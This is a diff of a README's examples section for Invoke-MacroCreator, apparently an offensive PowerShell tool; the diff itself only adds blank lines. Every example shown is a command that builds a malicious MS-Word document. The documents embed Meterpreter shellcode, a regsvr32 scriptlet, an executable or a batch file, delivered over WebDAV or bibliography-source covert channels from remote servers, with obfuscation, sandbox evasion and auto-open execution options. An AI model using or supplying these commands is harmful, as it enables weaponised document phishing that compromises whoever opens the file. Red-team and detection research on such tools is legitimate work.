@@ -47,19 +47,25 @@ Examples
 Here are some sample examples:
   
 Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion:
+
 `C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body`
   
 Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion:
+
 `C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o`
   
 Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion:
+
 `C:\PS> Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e`
   
 Executable delivered over WebDAV covert channel, using default UNC, no obfuscation, with sandbox evasion, using execution method 3:
+
 `C:\PS> Invoke-MacroCreator -i badass.exe -p file -t webdav -c 'badass.exe' -e -m 3`
   
 Command line embedded in the body of the MS-Word document, with obfuscation, no sandbox evasion, using execution method 1:
+
 `C:\PS> Invoke-MacroCreator -i my_cmd.bat -p cmd -t body -o -m 1`
   
 Shellcode embedded in a comment of the MS-Word document, no obfuscation, no sandbox evasion, adding auto-open functions:
+
 `C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d comment -a`
